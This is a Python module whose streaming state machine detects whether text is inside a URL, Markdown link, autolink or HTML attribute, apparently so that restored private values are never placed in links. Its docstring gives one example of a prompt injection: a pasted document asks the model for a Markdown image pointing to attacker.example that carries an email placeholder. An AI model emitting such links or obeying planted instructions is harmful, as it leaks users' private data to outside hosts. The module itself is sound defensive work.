"""Whether answer text, read left to right, is inside a link (ADR 0003 amendment 1).

Rehydration must never put an original value inside a URL: a pasted document can ask
the model for `![s](https://attacker.example/p.png?d=[EMAIL_1])`, and a Markdown
client fetches that image without a click. `LinkContext` reads the text as the
client will see it, restored values included, and says whether the next character
would be part of a link target:

- a bare URL: from `//` (so `scheme://` and protocol-relative `//host`) or a
  `www.` that starts a word, up to the next whitespace;
- a Markdown link or image target: from `](` to its closing `)`, nested
  parentheses and `<...>` destinations included, or to a blank line;
- a link reference definition: the destination after `[label]:` at the start of
  a line, on that line or the next;
- an autolink: `<scheme:` up to `>` or whitespace;
- an HTML attribute value of any attribute inside a tag, quoted or not.

Every rule errs towards "inside": a false positive leaves a placeholder visible,
a false negative can send a value off the machine. The state is a few flags and
the last five characters, so it streams in constant memory, and feeding text in
any number of pieces gives the same answers as feeding it whole.
"""

import re
from enum import Enum, auto


class _Ref(Enum):
    NONE = auto()
    CANDIDATE = auto()  # the line starts with `[`, so a `]:` would begin a definition
    AWAIT = auto()  # after `]:`, before the destination
    DEST = auto()
    ANGLE = auto()  # a destination in `<...>`


class _Tag(Enum):
    NONE = auto()
    NAME = auto()  # after `<` and a letter: a tag name, or an autolink's scheme
    AUTOLINK = auto()
    IN_TAG = auto()
    AWAIT_VALUE = auto()  # after `=`
    QUOTED = auto()
    UNQUOTED = auto()


_REF_INSIDE = frozenset({_Ref.AWAIT, _Ref.DEST, _Ref.ANGLE})
_TAG_INSIDE = frozenset({_Tag.AUTOLINK, _Tag.AWAIT_VALUE, _Tag.QUOTED, _Tag.UNQUOTED})
# Outside every context, only these characters can open one (or start a line).
_TRIGGER = re.compile(r"[\n/.(<]")
_RECENT = 5  # characters kept: `www.` needs the one before it
_MAX_INDENT = 3  # a reference definition may be indented by up to three spaces


class LinkContext:
    """Feed text in order; `inside` says whether the next character is in a link."""

    def __init__(self) -> None:
        self._recent = ""
        self._line_blank = True  # only whitespace so far on this line
        self._indent = 0
        self._bare = False
        self._md_depth: int | None = None  # open parentheses inside `](...)`
        self._md_angle = False
        self._ref = _Ref.NONE
        self._tag = _Tag.NONE
        self._quote = ""

    @property
    def inside(self) -> bool:
        return (
            self._bare
            or self._md_depth is not None
            or self._ref in _REF_INSIDE
            or self._tag in _TAG_INSIDE
        )

    def feed(self, text: str) -> None:
        index, end = 0, len(text)
        while index < end:
            if self._idle():
                found = _TRIGGER.search(text, index)
                stop = end if found is None else found.start()
                if stop > index:
                    self._recent = (self._recent + text[max(index, stop - _RECENT) : stop])[
                        -_RECENT:
                    ]
                    index = stop
                    continue
            self._step(text[index])
            index += 1

    def _idle(self) -> bool:
        """Nothing is open, and no character but a trigger can open anything."""
        return (
            not self._line_blank
            and not self._bare
            and self._md_depth is None
            and self._ref is _Ref.NONE
            and self._tag is _Tag.NONE
            and not self._recent.endswith("<")
        )

    def _step(self, char: str) -> None:
        prev = self._recent[-1:]
        self._line(char)
        self._bare_url(char, prev)
        self._markdown(char, prev)
        self._reference(char, prev)
        self._html(char, prev)
        self._recent = (self._recent + char)[-_RECENT:]

    def _line(self, char: str) -> None:
        if char == "\n":
            if self._line_blank:  # a blank line ends every Markdown construct
                self._md_depth = None
                self._md_angle = False
                self._ref = _Ref.NONE
                # A quoted attribute value runs on to its quote, blank lines included,
                # as a browser reads it; the rest of a tag ends here.
                if self._tag is not _Tag.QUOTED:
                    self._tag = _Tag.NONE
            if self._ref is _Ref.CANDIDATE:
                self._ref = _Ref.NONE
            self._line_blank = True
            self._indent = 0
        elif char.isspace():
            if self._line_blank:
                self._indent += 1
        elif self._line_blank:
            self._line_blank = False
            if char == "[" and self._indent <= _MAX_INDENT and self._ref is _Ref.NONE:
                self._ref = _Ref.CANDIDATE

    def _bare_url(self, char: str, prev: str) -> None:
        if self._bare:
            self._bare = not char.isspace()
        elif (char == "/" and prev == "/") or (char == "." and self._starts_www()):
            self._bare = True

    def _starts_www(self) -> bool:
        recent = self._recent
        return recent.endswith(("www", "WWW")) and (
            len(recent) <= len("www") or not recent[-4].isalnum()
        )

    def _markdown(self, char: str, prev: str) -> None:
        if self._md_depth is None:
            if char == "(" and prev == "]":
                self._md_depth = 0
        elif self._md_angle:
            self._md_angle = char != ">"
        elif char == "<":
            self._md_angle = True
        elif char == "(":
            self._md_depth += 1
        elif char == ")":
            self._md_depth = None if self._md_depth == 0 else self._md_depth - 1

    def _reference(self, char: str, prev: str) -> None:
        ref = self._ref
        if ref is _Ref.CANDIDATE:
            if char == ":" and prev == "]":
                self._ref = _Ref.AWAIT
        elif ref is _Ref.AWAIT:
            if char == "<":
                self._ref = _Ref.ANGLE
            elif not char.isspace():
                self._ref = _Ref.DEST
        elif ref is _Ref.DEST:
            if char.isspace():
                self._ref = _Ref.NONE
        elif ref is _Ref.ANGLE and char in ">\n":
            self._ref = _Ref.NONE

    def _html(self, char: str, prev: str) -> None:
        tag = self._tag
        if tag is _Tag.NONE:
            if prev == "<" and char.isascii() and char.isalpha():
                self._tag = _Tag.NAME
        elif tag is _Tag.QUOTED:
            if char == self._quote:
                self._tag = _Tag.IN_TAG
        elif tag is _Tag.AWAIT_VALUE:
            self._tag = _value_start(char)
            self._quote = char
        else:
            self._tag = _NEXT_TAG[tag](char)


def _after_name(char: str) -> _Tag:
    """The state after one more character of what followed `<` and a letter."""
    if char == ":":
        return _Tag.AUTOLINK  # `<https:`: a scheme, so an autolink
    if char.isascii() and (char.isalnum() or char in "+.-"):
        return _Tag.NAME
    if char.isspace() or char == "/":
        return _Tag.IN_TAG
    return _Tag.NONE


def _in_autolink(char: str) -> _Tag:
    return _Tag.NONE if char == ">" or char.isspace() else _Tag.AUTOLINK


def _in_tag(char: str) -> _Tag:
    if char == ">":
        return _Tag.NONE
    return _Tag.AWAIT_VALUE if char == "=" else _Tag.IN_TAG


def _in_unquoted(char: str) -> _Tag:
    if char == ">":
        return _Tag.NONE
    return _Tag.IN_TAG if char.isspace() else _Tag.UNQUOTED


def _value_start(char: str) -> _Tag:
    if char in "\"'":
        return _Tag.QUOTED
    if char == ">":
        return _Tag.NONE
    if char.isspace():
        return _Tag.AWAIT_VALUE
    return _Tag.UNQUOTED


_NEXT_TAG = {
    _Tag.NAME: _after_name,
    _Tag.AUTOLINK: _in_autolink,
    _Tag.IN_TAG: _in_tag,
    _Tag.UNQUOTED: _in_unquoted,
}
